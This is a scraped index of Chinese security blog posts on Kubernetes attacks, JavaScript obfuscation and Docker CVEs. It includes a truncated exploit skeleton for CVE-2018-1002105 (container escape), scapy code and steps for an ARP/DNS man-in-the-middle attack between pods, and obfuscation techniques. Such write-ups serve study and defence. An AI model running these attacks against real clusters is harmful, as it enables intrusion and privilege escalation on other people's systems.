步中窃取到的文件，创建挂载了宿主机根目录的 Pod，实现容器逃逸。 EXP 如下： \"\"\"ExP for CVE-2018-1002105 ONLY USED FOR SECURITY RESEARCH ILLEGAL USE IS **PROHIBITED** \"\"\" from secrets import base64, token_bytes import sys import argparse import socket import ssl from urllib import parse import json try: from http_parser.parser import HttpParser except ImportError: from http_parser.pyparser import HttpParser context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH) # Args parser = argparse.ArgumentParser(description='ExP for CVE-2018-1002105.') required = parser.add_argument_group('required arguments') required.add_argument('--target', '-t', dest='host', type=str, help='API Server\\'s IP', required=True) required.add_argument('--port', '-p', dest='port', type=str, help='API Server\\'s port', required=True) required.add_argument('--bearer-token', '-b', dest='token', type=str, help='Bearer token for the low privileged user', required=True) required.add_argument('--namespace', '-n', dest='namespace', type=str, help='Namespace with method access', default='default', required=True) required.add_argument('--pod', '-P', dest='pod', type=str, required=T","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:3:3","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"4 k8s 中间人攻击 Flannel 是 CoreOS 团队针对 Kubernetes 设计的一个网络规划服务，简单来说，它的功能是让集群中的不同节点主机创建的 Docker 容器都具有全集群唯一的虚拟 IP 地址。 ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:4:0","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"4.1 背景 在默认的 Docker 配置中，每个节点上的 Docker 服务会分别负责所在节点容器的 IP 分配。这样导致的一个问题是，不同节点上容器可能获得相同的内外 IP 地址。 Flannel 的设计目的就是为集群中的所有节点重新规划 IP 地址的使用规则，从而使得不同节点上的容器能够获得同属一个内网且不重复的 IP 地址，并让属于不同节点上的容器能够直接通过内网 IP 通信。 以 Flannel 作为集群网络查件时，部署 k8s 集群的网络架构如下图所示： 每个节点上会创建一个CNI 网桥（默认设备名称为 cni0）。每个 Pod 存在域自己的网络命名空间中，通过虚拟网卡对 Veth pair 设备与外界通信。 Veth pair 设备将创建两张虚拟网卡，分别位于 Pod 所在的网络命名空间中和节点根网络命名空间中，互为对端（Veth peer)，对于 Veth pair 设备的两张虚拟网卡来说，从其中一张网卡发出的数据包，将直接出现在另一张网卡上。 每个Pod 的 eth0 网卡的对端 veth 网卡“插”在 cni0 网桥上。同一节点上的各 pod 可以借助 cni0 网桥互相通信，不同节点之间需要借助额外的网络插件进行通信。 CoreDNS 是整个 Kubernetes 集群的 DNS 服务器。 这样的网络会存在哪些安全问题呢？ 所有这此 Pod 似乎组成了一个小型的局域网络，这个网络中可能存在中间人攻击。在默认配置下的 Kubernetes 集群中，假如攻击者借助 Web渗透等方式攻破了某个Pod，就有可能针对集群内的其它 Pod 发起中间人攻击，甚至可以基于此实现 DNS 劫持。 攻击者攻破 Web App Pod 之后，获得容器内部的 root 权限，通过 ARP 欺骗诱导另一个Pod ，让其以为 Web App Pod 是集群的 DNS 服务器，进而使得 Backend pod 在对外发起针对某域名（如 example.com）的 HTTP 请求时首先向 Web App Pod 发起 DNS 查询请求。 攻击者在 Web App Pod 内部设置的恶意 DNS 服务器收到查询请求后返回了自己的 IP 地址，Backend Pod 因此以为 example.com 域名的 IP 地址是 Web App Pod 的地址，于是向 Web App Pod 发起 HTTP 请求。 在收到 HTTP 请求后，攻古者在 web App Pod 内设置的恶意 HTTP 服务器返回恶意响应给 Backend Pod。至此，整个攻击过程结束，Baokend Pod 以为自己拿到了正确的信息，其实不然。 ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:4:1","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"4.2 场景 4.2.1 MITM 需要的网络权限 结合 Linux 系统 Capablities 知识可知，要想进行中间人攻击，如发送 ARP 包，需要具有 CAP_NET_RAW 权限。那么，容器内部的 root 用户是否具有该权限呢？ 可以看到，默认情况下，Pod 是具有 CAP_NET_RAW 权限的。 4.2.2 k8s 与 DNS 首先，k8s 以服务资源 kube-dns 的形式提供集群级别的 DNS 服务： Kube-dns 服务依赖的是集群中 kube-system 命名空间下的 CoreDNS Pod。 在新建的 Pod 内部可以发现 resolv.conf 文件中记录的 DNS 服务器 IP 地址为 kube-dns 服务的地址： 当这个 Pod 向 kube-dns 服务发起 DNS 查询请求时，查询请求经过 iptables，最终被发送到服务后端的 Core DNS 中。 4.2.3 k8s 与 ARP 当 Pod 向外发 ARP 请求时，该请求会被网桥转发给其它接口，因此，其它 Pod 就能够收到 ARP 请求，其中网卡 MAC 地址与 ARP 请求相符的 Pod 就会发送 ARP 响应，这响应同样会被网桥转发给发送 ARP Requests 的 Pod。 ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:4:2","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"4.3 原理 假设某 Pod A 需要访问 example.com，那么它首先必须知道该域名对应的 IP，因此，它需要发出一个DNS 查询请求。默认情况下，pod A 会向集群 DNS 服务 kube-dns 发起请求。 DNS 请求实际上是一个 UDP 报文，在我的环境中，kube-dns 服务的 IP 为 10.96.0.10，而 PodA 的 IP 为 192.168.166.134。两者不在同一子网。因此，该 UDP 报文会被 Pod A 发送给默认网关，也就是 cni0。接着，节点 iptables 对该报文进行 DNAT 处理，将目的地改为 192.168.219.77，也就是 CoreDNS Pod 的 IP 地址。 由于 Pod A 并未直接向 192.168.219.77 发出请求，上面的 ARP 解析过程是 cni0 负责的。因此，攻击者只需要对 cni0 发起恶意攻击即可。 但攻击者在 Pod 内，如何获得 cni0 网桥和 CoreDNS Pod 的网络信息呢？ 首先是 cni0 网桥。网桥的 IP 和MAC 地址获取方式比较多样。例如，由于 cnio 既是网桥又是默认网关，我们可以直接查询 Pod 的路由表，获得网桥 IP 地址： route -n 然后直接查询 ARP 缓存，获得网桥 MAC 地址。如果没有，可以先向网桥发送一个 ARP 请求： arp -n 其次是 Core DNS Pod 的 IP 和 MAC 地址。结合背最知识部分 DNS 内容可知。pod 内部仅仅能拿到一个kube-dns 服务的 IP，通常是 10.96.0.10。但是，如果攻击者 pod 向该服务发送一个 DNS 查询请求，实际上是服务背后的 Core DNS Pod 回复 DNS 响应的（经过 DNAT 处理，目的地改为 CoreDNS Pod)。而 DNS 响应又是一个 UDP 报文，因此我们可以从中提取到 CoreDNS Pod 的 MAC 地址。但是，DNS 响应又会被进行 SNAT 处理，其中的 IP 地址被重新替换为 kube-dns 服务 IP 10.96.0.10。所以，以上步骤只能让攻击者拿到 CoreDNS Pod 的 MAC 地址。 所以，攻击者可以向整个子网的每个 IP 发出 ARP 请求，收集它们的 MAC 地址，然后与前面获得的 CoreDNS Pod 的 MAC 地址进行比对，如果一致，则说明对应 IP 即为 CoreDNS Pod 的 IP。 相关代码如下： def get_coredns_pod_mac_ip(kube_dns_svc_ip, self_ip, verbose): mac = srp1(Ether() / IP(dst=kube_dns_svc_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR()), verbose=verbose).src answers, _ = srp(Ether(dst=\"ff:ff:ff:ff:ff:ff\") / ARP(pdst=\"{}/24\".format(self_ip)), timeout=4, verbose=verbose) for answer in answers: if answer[1].src == mac: return mac, answer[1][ARP].psrc return None, None ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:4:3","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"4.4 复现 代码：云原生网络攻击 模拟构建攻击者镜像： docker build -t k8s_dns_mitm:1.0 . 使用 exploit.sh 分别部署 attacker 和 victim pod： ./exploit.sh ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:4:4","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["代码审计"],"content":"JavaScript 反混淆","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/","tags":["代码审计","JavaScript"],"title":"JavaScript 反混淆","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["代码审计"],"content":"JavaScript 反混淆 ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:0:0","tags":["代码审计","JavaScript"],"title":"JavaScript 反混淆","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["代码审计"],"content":"1 常量的混淆原理 ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:1:0","tags":["代码审计","JavaScript"],"title":"JavaScript 反混淆","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["代码审计"],"content":"1.1 对象属性的两种访问方式 JavaScript 中，对象访问属性有两种方式。 用点访问 用括号访问 function People(name) { this.name = name; } People.prototype.sayHello = function () { console.log('Hello'); } var p = new People('pName'); console.log(p.name); //pName p.sayHello(); //Hello console.log(p['name']); //pName p['sayHello'](); //Hello 用括号访问的方式可以针对其中的字符串做混淆 ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:1:1","tags":["代码审计","JavaScript"],"title":"JavaScript 反混淆","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["代码审计"],"content":"1.2 常见的混淆方式 1.2.1 十六进制字符串 以下面这段代码为例： Date.prototype.format = function (formatStr) { var str = formatStr; var Week = ['日', '一', '二', '三', '四', '五', '六']; str = str.replace(/yyyy|YYYY/, this.getFullYear()); str = str.replace(/MM/, (this.getMonth() + 1) \u003e 9 ? (this.getMonth() + 1).toString() : '0' + (this.getMonth() + 1)); str = str.replace(/dd|DD/, this.getDate() \u003e 9 ? this.getDate().toString() : '0' + this.getDate()); return str; } console.log(new Date().format('yyyy-MM-dd')); 针对代码中出现的字符串，可以将其转换为 16 进制。 Date.prototype.format = function (formatStr) { var str = formatStr; var Week = ['日', '一', '二', '三', '四', '五', '六']; str = str.replace(/yyyy|YYYY/, this.getFullYear()); str = str.replace(/MM/, (this.getMonth() + 1) \u003e 9 ? (this.getMonth() + 1).toString() : '0' + (this.getMonth() + 1)); str = str.replace(/dd|DD/, this.getDate() \u003e 9 ? this.getDate().toString() : '0' + this.getDate()); return str; } console.log(new Date().format('\\x79\\x79\\x79\\x79\\x2d\\x4d\\x4d\\x2d\\x64\\x64')); 1.2.2 unicode 字符串 在 JS 中，字符串除了可以表示成十六进制的形式外，还支持 unicode 编码。 以 var Week = ['日', '一', '二', '三', '四', '五', '六']; 为例，可以转换成： var Week = ['\\u65e5', '\\u4e00', '\\u4e8c', '\\u4e09', '\\u56db', '\\u4e94', '\\u516d']; 此外，JS 解析器同样支持 unicode 编码出现在标识符中： Date.prototype.\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074 = function(formatStr) { var \\u0073\\u0074\\u0072 = \\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0053\\u0074\\u0072; var Week = ['\\u65e5', '\\u4e00', '\\u4e8c', '\\u4e09', '\\u56db', '\\u4e94', '\\u516d']; str = str['replace'](/yyyy|YYYY/, this['getFullYear']()); str = str['replace'](/MM/, (this['getMonth']() + 1) \u003e 9 ? (this['getMonth']() + 1)['toString']() : '0' + (this['getMonth']() + 1)); str = str['replace'](/dd|DD/, this['getDate']() \u003e 9 ? this['getDate']()['toString']() : '0' + this['getDate']()); return str; } console.log( new \\u0077\\u0069\\u006e\\u0064\\u006f\\u0077['\\u0044\\u0061\\u0074\\u0065']()['format']('\\x79\\x79\\x79\\x79\\x2d\\x4d\\x4d\\x2d\\x64\\x64') ); 1.2.3 字符串的 ASCII 码 为了完成字符串的 ASCII 码混淆，在这里需要使用两个函数，一个是 String 对象下的 charCodeAt 方法，另外一个是 String 类下的 fronCharCode 方法： console.log(\"G\".charCodeAt(0)); // 71 console.log(\"e\".charCodeAt(0)); // 101 console.log(String.fromCharCode(71, 101)); function stringToByte(str) { var byteArr = []; for (var i = 0; i \u003c str.length; i++) { byteArr.push(str.charCodeAt(i)); } return byteArr; } console.log(stringToByte('Geekby')); 将代码转换成字符串后，利用 eval 函数去执行： Date.prototype.\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074 = function(formatStr) { var \\u0073\\u0074\\u0072 = \\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0053\\u0074\\u0072; var Week = ['\\u65e5', '\\u4e00', '\\u4e8c', '\\u4e09', '\\u56db', '\\u4e94', '\\u516d']; eval(String.fromCharCode(115, 116, 114, 32, 61, 32, 115, 116, 114, 91, 39, 114, 101, 112, 108, 97, 99, 101, 39, 93, 40, 47, 121, 121, 121, 121, 124, 89, 89, 89, 89, 47, 44, 32, 116, 104, 105, 115, 91, 39, 103, 101, 116, 70, 117, 108, 108, 89, 101, 97, 114, 39, 93, 40, 41, 41, 59)); str = str['replace'](/MM/, (this['getMonth']() + 1) \u003e 9 ? (this['getMonth']() + 1)['toString']() : '0' + (this['getMonth']() + 1)); str = str['replace'](/dd|DD/, this['getDate']() \u003e 9 ? this['getDate']()['toString']() : '0' + this['getDate']()); return str; } console.log( new \\u0077\\u0069\\u006e\\u0064\\u006f\\u0077['\\u0044\\u0061\\u0074\\u0065']()[String.fromCharCode(102, 111, 114, 109, 97, 116)]('\\x79\\x79\\x79\\x79\\x2d\\x4d\\x4d\\x2d\\x64\\x64') ); //输出结果 2020-07-04 1.2.4 字符串常量编码或加密 字符串常量编码或加密的核心思想是，先把字符串编码或加密得到密文，然后在使用之前，调用对应的解码或解密函数去解密，得到明文。 JS 中自带 Base64 编码解码的函数，btoa 用来编码，atob 用来解码。 但在实际的混淆应用中，最好还是采用自定义函数的方式，然后加以混淆。在这里就用 atob 来代替 Base64 解码，处理后的代码为： Date.prototype.\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074 = function(formatStr) { var \\u0073\\u0074\\u0072 = \\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0053\\u0074\\u0072; var Week = ['\\u65e5', '\\u4e00', '\\u4e8c', '\\u4e09', '\\u56db', '\\u4e94', '\\u516d']; eval(String.fromCharCode(115, 116, 114, 32, 61, 32, 115, 116, 114, 91, 39, 114, 101, 112, 108, 97, 99, 101, 39, 93, 40, 47, 121, 121, 121, 121, 124, 89, 89, 89, 89, 47, 44, 32, 116, 104, 105, 115, 91, 39, 103, 101, 116, 70, 117, 108, 10","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:1:2","tags":["代码审计","JavaScript"],"title":"JavaScript 反混淆","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["代码审计"],"content":"2 增加逆向工作量 ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:2:0","tags":["代码审计","JavaScript"],"title":"JavaScript 反混淆","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["代码审计"],"content":"2.1 数组混淆 把代码中所有的字符串，都提取到一个数组中，然后需要引用字符串的地方，全都以数组下标的方式去访问数组成员。 var bigArr = ['Date', 'getTime', 'log']; console[bigArr[2]](new window[bigArr[0]]()[bigArr[1]]()); console[\"log\"](new window.Date().getTime()) var bigArr = [ '\\u65e5', '\\u4e00', '\\u4e8c', '\\u4e09', '\\u56db', '\\u4e94', '\\u516d', 'cmVwbGFjZQ==', 'Z2V0TW9udGg=', 'dG9TdHJpbmc=', 'Z2V0RGF0ZQ==', 'MA==', \"\"['constructor']['fromCharCode'] ]; Date.prototype.\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074 = function(formatStr) { var \\u0073\\u0074\\u0072 = \\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0053\\u0074\\u0072; var Week = [bigArr[0], bigArr[1], bigArr[2], bigArr[3], bigArr[4], bigArr[5], bigArr[6]]; eval(String.fromCharCode(115, 116, 114, 32, 61, 32, 115, 116, 114, 91, 39, 114, 101, 112, 108, 97, 99, 101, 39, 93, 40, 47, 121, 121, 121, 121, 124, 89, 89, 89, 89, 47, 44, 32, 116, 104, 105, 115, 91, 39, 103, 101, 116, 70, 117, 108, 108, 89, 101, 97, 114, 39, 93, 40, 41, 41, 59)); str = str[atob(bigArr[7])](/MM/, (this[atob(bigArr[8])]() + 1) \u003e 9 ? (this[atob(bigArr[8])]() + 1)[atob(bigArr[9])]() : atob(bigArr[11]) + (this[atob(bigArr[8])]() + 1)); str = str[atob(bigArr[7])](/dd|DD/, this[atob(bigArr[10])]() \u003e 9 ? this[atob(bigArr[10])]()[atob(bigArr[9])]() : atob(bigArr[11]) + this[atob(bigArr[10])]()); return str; } console.log( new \\u0077\\u0069\\u006e\\u0064\\u006f\\u0077['\\u0044\\u0061\\u0074\\u0065']()[bigArr[12](102, 111, 114, 109, 97, 116)]('\\x79\\x79\\x79\\x79\\x2d\\x4d\\x4d\\x2d\\x64\\x64') ); ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:2:1","tags":["代码审计","JavaScript"],"title":"JavaScript 反混淆","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["代码审计"],"content":"2.2 数组乱序 将上述提取出来的数组顺序打乱，在取元素时，进行还原。 var bigArr = [ '\\u65e5', '\\u4e00', '\\u4e8c', '\\u4e09', '\\u56db', '\\u4e94', '\\u516d', 'cmVwbGFjZQ==', 'Z2V0TW9udGg=', 'dG9TdHJpbmc=', 'Z2V0RGF0ZQ==', 'MA==', \"\"['constructor']['fromCharCode'] ]; (function(arr, num){ var shuffer = function(nums){ while(--nums){ arr.unshift(arr.pop()); } }; shuffer(++num); }(bigArr, 0x20)); console.log( bigArr ); ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:2:2","tags":["代码审计","JavaScript"],"title":"JavaScript 反混淆","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["代码审计"],"content":"2.3 花指令 给代码添加一些没有意义的代码，是花指令的核心。例如：把 this.getMonth() + 1 这个二项式稍作变动： function _0x20ab1fxe1(a, b){ return a + b; } // _0x20ab1fxe1(this.getMonth(), 1); _0x20ab1fxe1(new Date().getMonth(), 1); //输出 11 还可以进一步嵌套： function _0x20ab1fxe2(a, b){ return a + b; } function _0x20ab1fxe1(a, b){ return _0x20ab1fxe2(a, b); } _0x20ab1fxe1(new Date().getMonth(), 1); //输出 11 此外，为了进一步增加代码复杂度，可以将相同功能的代码放到不同的函数当中： function _0x20ab1fxe2(a, b){ return a + b; } function _0x20ab1fxe1(a, b){ return _0x20ab1fxe2(a, b); } function _0x20ab1fxe3(a, b){ return a + b; } function _0x20ab1fxe4(a, b){ return _0x20ab1fxe3(a, b); } _0x20ab1fxe4('0', _0x20ab1fxe1(new Date().getMonth(), 1)); //输出 \"11\" ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:2:3","tags":["代码审计","JavaScript"],"title":"JavaScript 反混淆","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["代码审计"],"content":"2.4 jsfuck jsfuck 可以算是一种编码。它能把 JS 代码转化成只用 6 个字符就可以表示的代码，且完全可以正常执行。 这 6 个字符分别是 []()!+。转换之后的 JS 代码难以阅读，可以作为些简单的混淆措施。 在线编码的网站：http://www.jsfuck.com ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:2:4","tags":["代码审计","JavaScript"],"title":"JavaScript 反混淆","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["代码审计"],"content":"3 代码执行流程的防护原理 ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:3:0","tags":["代码审计","JavaScript"],"title":"JavaScript 反混淆","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["代码审计"],"content":"3.1 流程平坦化 代码本来是依照逻辑顺序执行的，控制流平坦化是把原来的代码的基本块拆分。 把本来顺序执行的代码块用 switch case 打乱分发，用分发器和一个变量，把原本代码的逻辑连接起来。 如下面这段代码： function test1(){ var a = 1000; var b = a + 2000; var c = b + 3000; var d = c + 4000; var e = d + 5000; var f = e + 6000; return f; } console.log( test1() ); 经过流程平坦化之后，变为： function test2(){ var arrStr = '7|5|1|3|2|4|6'.split('|'), i = 0; while (!![]) { switch(arrStr[i++]){ case '1': var c = b + 3000; continue; case '2': var e = d + 5000; continue; case '3': var d = c + 4000; continue; case '4': var f = e + 6000; continue; case '5': var b = a + 2000; continue; case '6': return f; continue; case '7': var a = 1000; continue; } break; } } console.log( test2() ); //输出 21000 ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:3:1","tags":["代码审计","JavaScript"],"title":"JavaScript 反混淆","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["代码审计"],"content":"3.2 逗号表达式混淆 逗号表达式混淆主要的作用是把多个表达式或语句连接成一个复合语句。上一节的原始代码等价于： function test1(){ var a, b, c, d, e, f; return a = 1000, b = a + 2000, c = b + 3000, d = c + 4000, e = d + 5000, f = e + 6000, f } console.log( test1() ); //输出 21000 return 语句后面，通常只能跟一个表达式，它会返回这个表达式计算之后的结果。但是逗号运算符，可以把多个表达式，连接成一个复合语句。 因此上述代码中，这么使用 return 语句也是没有问题的，会返回最后一个表达式计算之后的结果，但是前面的表达式依然会执行。 上述案例只是单纯的连接语句，这种没有混淆力度，再来看一个案例： function test2(){ var a, b, c, d, e, f; return f = (e = (d = (c = (b = (a = 1000, a + 2000), b + 3000), c + 4000), d + 5000), e + 6000); } console.log( test2() ); //输出 21000 此外，逗号表达式混淆还可以处理调用表达式、成员表达式等。案例如下： var obj = { name: 'Geekby', add: function(a, b){ return a + b; } } function sub(a, b){ return a - b; } function test(){ var a = 1000; var b = sub(a,3000) + 1; var c = b + obj.add(b, 2000); return c + obj.name } test 函数中有函数调用表达式 sub()，还有成员表达式 obj.add 等。 可以转换成如下形式： var obj = { name: 'Geekby', add: function(a, b){ return a + b; } } function sub(a, b){ return a - b; } function test() { return c = (b = (a = 1000, sub)(a, 3000) + 1, b + (0, obj).add(b, 2000)), c + (0, obj).name; } ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:3:2","tags":["代码审计","JavaScript"],"title":"JavaScript 反混淆","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["代码审计"],"content":"4 Babel 的 API Javascript 的语法是非常灵活的，如果直接处理 JS 代码来做混淆或者还原，那无疑是很麻烦的，而且容易出错。但是把 JS 代码转换成抽象语法树以后，一切就变得简单了。 在编译原理里，从源码到机器码的过程，中间还需要经过很多步骤。比如，源码通过词法分析器变为 Token，再通过语法分析器变为 AST，再通过语义分析器，往下编译，最后变成机器码。所以，AST 实际上是一个概念性的东西，当实现了词法分析器和语法分析器，就能把不同的语言解析成 AST 把 JS 代码转换成 AST，可以使用现成的解析库。当使用的解析库不一样的时候，生成的 AST 会有所区别。本文采用的是 Babel，是一个 nodejs 库。在用 AST 自动化处理 JS 代码前，先对相关 API 进行阐述。 ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:4:0","tags":["代码审计","JavaScript"],"title":"JavaScript 反混淆","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["代码审计"],"content":"4.1 AST 的基本结构 JS 代码解析成 AST 以后，其实就相当于是 json 数据。经过 Babel 解析以后，通常把里 面的一些元素叫做节点(Node），同时 Babel 也提供了很多方法去操作这些节点。以一个案例来说明 AST 的基本结构，代码如下： let obj = { name: 'Hello World', add: function (a, b) { return a + b + 1000; }, mul: function (a, b) { return a * b + 1000; }, }; Babel 的在线版本：https://astexplorer.net ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:4:1","tags":["代码审计","JavaScript"],"title":"JavaScript 反混淆","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["代码审计"],"content":"4.2 Babel 中的组件 4.2.1 parser 与 generator parser 组件用来将 JS 代码转换成 AST，generator 用来将 AST 转换成 JS 代码。 使用 let ast = parser. parse(jscode); 即可完成 JS 代码转换到 AST 的过程。这时候 把 AST 输出来。输出前通常先使用 JSON.stringify 把对象转 json 数据。比如，console.log (JSON. stringify(ast, null, 2))。另外，parser 的 parse 方法，其实是有第二个參数的。 let ast = parser.parse(jscode, { sourceType: \"module\", }); sourceType 默认是 script。当解析的 JS 代码中含有 import、export 等关键字的时候，需要指定 sourceType 为 module。不然会报错： SyntaxError: 'import' and 'export' may appear only with 'sourceType: \"module\"' (1:0) 使用 let code = generator(ast).code，即可把 AST 转换为 JS 代码。 generator 返回的是一个对象，其中的 code 属性才是需要的代码。同时，generator 的第二个参数接收一个对象，可以设置一些选项，来影响输出的结果。完整的选项介绍，可参考 Babel 官方文档：https://babeljs.io/docs/en/babel-generator。 如： // retainLines：表示是否使用与源代码相同的行号，默认为 false let code = generator(ast, {retainLines: false}); // comments：表示是否保留注释，默认为 true let code = generator(ast, {comments: false}); // compact 表示是否压缩代码，与其作用相同的选项还有 minified、concise，压缩程度不同 let code = generator(ast, {minified: true}); 4.2.2 traverse 与 visitor traverse 组件用来遍历 AST。traverse 一般需要配合 visitor 使用。visitor 是一个对象，里面可以定义一些方法，用来过滤节点。举例如下： // 遍历 FunctionExpression 节点 let visitor = {}; visitor.FunctionExpression = function(path){ console.log(\"visitor\"); }; traverse(ast, visitor); 另外一种遍历方式： const visitor = { FunctionExpression: { enter(path) { console.log(\"visitor enter\"); }, exit(path) { console.log(\"visitor exit\"); } } }; traverse(ast, visitor); 正确的选择节点处理时机，有助于提高代码效率。traverse 是一个深度优先的遍历过程。因此，如果存在父子节点，那么 enter 的处理时机是先处理父节点，再处理子节点。而 exit 的处理时机是先处理子节点，再处理父节点。traverse 默认就是在 enter 时候处理，如果要在 exit 时候处理，必须在 visitor 中写明。 4.2.3 types 该组件主要用来判断节点类型，生成新的节点等。判断节点类型很简单。 traverse(ast, { enter(path) { if ( path.node.type === \"Identifier\" \u0026\u0026 path.node.name === \"n\" ){ path.node.name = \"x\"; } } }); 构造节点： let obj = {}; obj.type = 'BinaryExpression'; obj.left = {type: 'NumericLiteral', value: 1000}; obj.operator = '/'; obj.right = {type: 'NumericLiteral', value: 2000}; let code = generator(obj).code; 4.2.4 path 对象 ","date":"2021-11-18","objectID":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/:4:2","tags":["代码审计","JavaScript"],"title":"JavaScript 反混淆","uri":"/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/"},{"categories":["云原生安全"],"content":"容器基础设施的安全风险分析","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/","tags":["云原生安全","docker"],"title":"容器安全","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"容器基础设施的安全风险分析 在云原生生态中已经有很多种不同的容器运行时实现，但考虑到稳定性和使用的广泛程度，下面仍以 docker 为例进行分析。 从容器镜像、活动容器、容器网络、容器管理接口、宿主机操作系统和软件漏洞等六方面来分析容器基础设施可能存在的风险。 ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:0:0","tags":["云原生安全","docker"],"title":"容器安全","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"1 针对容器开发测试过程中的攻击案例 ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:1:0","tags":["云原生安全","docker"],"title":"容器安全","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"1.1 背景 docker cp 命令 docker cp 命令用于在 Docker 创建的容器中与宿主机文件系统之间进行文件或目录复制。 符号链接 符号链接 - 软连接。类似于 windows 上的快捷方式 在 linux 中创建符号链接： ln -s target_path link_path ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:1:1","tags":["云原生安全","docker"],"title":"容器安全","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"1.2 CVE-2018-15664 - 符号链接替换漏洞 影响版本：Docker 在 17.06.0-ce～17.12.1-ce:rc2，18.01.0-ce～18.06.1-ce:rc2 版本范围内受该漏洞影响 1.2.1 原理 漏洞 poc 参考作者 Aleksa Sarai 公布的 poc 文件：https://seclists.org/oss-sec/2019/q2/131 CVE-2018-15664 实际上是一个 TOCTOU(time-of-check to time-of-use) 的问题。当用户执行 docker cp 命令后，Docker 